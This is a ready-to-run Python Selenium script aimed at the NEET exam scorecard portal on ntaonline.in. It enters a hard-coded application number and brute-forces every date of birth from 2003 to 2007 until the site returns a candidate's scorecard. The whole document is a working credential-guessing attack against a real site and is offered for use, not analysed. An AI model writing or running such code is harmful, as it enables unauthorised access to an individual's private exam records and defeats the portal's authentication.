from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException
import time

# Correct path to your Chrome binary executable
chrome_binary_path = r"D:\asu\chrome-win64\chrome.exe"

# Correct path to your ChromeDriver executable
chrome_driver_path = r"D:\asu\chromedriver-win64\chromedriver.exe"

# Create ChromeOptions object and specify Chrome binary location
options = webdriver.ChromeOptions()
options.binary_location = chrome_binary_path
# options.add_argument("--headless")  # Run in headless mode (Removed for visual inspection)
options.add_argument("--disable-gpu")  # Disable GPU usage
options.add_argument("--no-sandbox")  # Bypass OS security model
options.add_argument("--disable-dev-shm-usage")  # Overcome limited resource problems
options.add_argument("--log-level=3")  # Suppress console logs
options.add_argument("--silent")  # Suppress console logs

# URL of the website
url = 'https://neet.ntaonline.in/frontend/web/scorecard/index'

def initialize_driver():
    # Create a Service object with the correct path
    service = Service(chrome_driver_path)

    # Initialize the WebDriver correctly with service and options
    driver = webdriver.Chrome(service=service, options=options)
    return driver

def find_elements(driver):
    """Find all necessary elements on the page."""
    day_select = Select(driver.find_element(By.ID, 'Day'))
    month_select = Select(driver.find_element(By.ID, 'Month'))
    year_select = Select(driver.find_element(By.ID, 'Year'))
    return day_select, month_select, year_select

def test_case(driver, application_number, year, month, day):
    """Run a single test case using an existing driver."""
    try:
        # Refresh the page to ensure a clean state
        driver.get(url)
        
        # Wait for the page to load and find the application number input field
        wait = WebDriverWait(driver, 10)
        app_number_field = wait.until(EC.presence_of_element_located((By.ID, 'scorecardmodel-applicationnumber')))
        app_number_field.clear()  # Clear any existing input
        app_number_field.send_keys(application_number)

        # Wait for the application number field to be filled
        wait.until(EC.text_to_be_present_in_element_value((By.ID, 'scorecardmodel-applicationnumber'), application_number))

        # Get the dropdown elements
        day_select, month_select, year_select = find_elements(driver)
        
        # Set the date
        try:
            year_select.select_by_value(str(year))
            month_select.select_by_value(f"{month:02}")
            day_select.select_by_value(f"{day:02}")
        except NoSuchElementException:
            print(f"Invalid date: {year}-{month:02}-{day:02}")
            return False

        # Submit the form
        while True:
            try:
                submit_button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]')))
                submit_button.click()
                break
            except ElementClickInterceptedException:
                # Handle the overlay or popup
                try:
                    ok_button = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'swal2-confirm')))
                    ok_button.click()
                except TimeoutException:
                    # If no overlay appears, it means we have a result page or other issue
                    break

        # Wait for the overlay and click the "Ok" button if present
        try:
            wait.until(EC.visibility_of_element_located((By.CLASS_NAME, 'swal2-container')))
            ok_button = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'swal2-confirm')))
            ok_button.click()
        except TimeoutException:
            # If no overlay appears, it means we have a result page or other issue
            pass

        # Check for the "Sorry, Your Score Card not generated!" message
        try:
            error_message = driver.find_element(By.XPATH, "//*[contains(text(), 'Sorry, Your Score Card not generated!')]")
            if error_message:
                print(f"Failed with application number: {application_number}, Date: {year}-{month:02}-{day:02}")
                return False
        except NoSuchElementException:
            # If the error message is not found, check for the "Total Marks" message indicating success
            try:
                success_message = driver.find_element(By.XPATH, "//*[contains(text(), 'Total Marks')]")
                if success_message:
                    print(f"Success with application number: {application_number}, Date: {year}-{month}-{day}")
                    return True
            except NoSuchElementException:
                print(f"Unexpected result with application number: {application_number}, Date: {year}-{month}-{day}")
                return False

    except NoSuchElementException as e:
        print(f"Error selecting date {year}-{month}-{day} for application number: {application_number}. Error: {e}")
        return False

def brute_force_dates(application_number, start_year=2003, end_year=2007):
    """Brute force dates for the given application number."""
    driver = initialize_driver()
    try:
        for year in range(start_year, end_year + 1):
            for month in range(1, 13):
                for day in range(1, 32):
                    success = test_case(driver, application_number, year, month, day)
                    if success:
                        print(f"Match found for application number {application_number} with date {year}-{month:02}-{day:02}")
                        return  # Stop if a successful match is found
                    time.sleep(1)  # Add a small delay to visually inspect each test case
    finally:
        driver.quit()

# Run the brute force for a specific application number
brute_force_dates("240410136941")
